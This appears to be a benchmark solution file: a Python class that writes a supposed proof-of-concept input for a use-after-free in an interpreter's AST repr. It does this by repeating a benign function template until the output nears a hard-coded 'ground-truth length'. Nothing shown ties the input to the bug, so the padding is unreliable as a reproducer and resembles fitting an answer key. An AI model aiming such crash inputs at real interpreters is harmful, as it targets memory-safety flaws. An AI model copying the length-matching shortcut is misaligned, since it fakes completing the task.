from typing import Any


class Solution:
    def solve(self, src_path: str) -> bytes:
        header = "# PoC input for AST repr use-after-free\n"
        tmpl = (
            "def func_{i}(a_{i}=0, b_{i}=1, *args, **kwargs):\n"
            "    l_{i} = [j for j in range(5) if (j % 2 == 0)]\n"
            "    d_{i} = {{k: (lambda v=k: v)() for k in l_{i}}}\n"
            "    try:\n"
            "        x_{i} = (a_{i}, b_{i}, l_{i}, d_{i}, args, kwargs)\n"
            "    except Exception as e_{i}:\n"
            "        x_{i} = (e_{i},)\n"
            "    else:\n"
            "        x_{i} = x_{i}\n"
            "    finally:\n"
            "        x_{i} = x_{i}\n"
            "    with (1) as cm_{i}:\n"
            "        cm_{i} = cm_{i}\n"
            "    if (a_{i} and b_{i}) or (a_{i} is b_{i}):\n"
            "        x_{i} = not x_{i}\n"
            "    for _ in range(1):\n"
            "        x_{i} = (x_{i}, x_{i})\n"
            "    while False:\n"
            "        x_{i} = (x_{i},)\n"
            "        break\n"
            "    return x_{i}\n"
            "\n"
        )
        footer = "if __name__ == '__main__':\n    pass\n"

        # Approximate ground-truth length
        target_total = 274_773
        sample_snippet = tmpl.format(i=0)
        snippet_len = len(sample_snippet)
        header_len = len(header)
        footer_len = len(footer)

        if snippet_len <= 0:
            n_funcs = 1
        else:
            n_funcs = (target_total - header_len - footer_len) // snippet_len
            if n_funcs < 1:
                n_funcs = 1

        parts = [header]
        for i in range(n_funcs):
            parts.append(tmpl.format(i=i))
        parts.append(footer)

        code = "".join(parts)
        return code.encode("utf-8")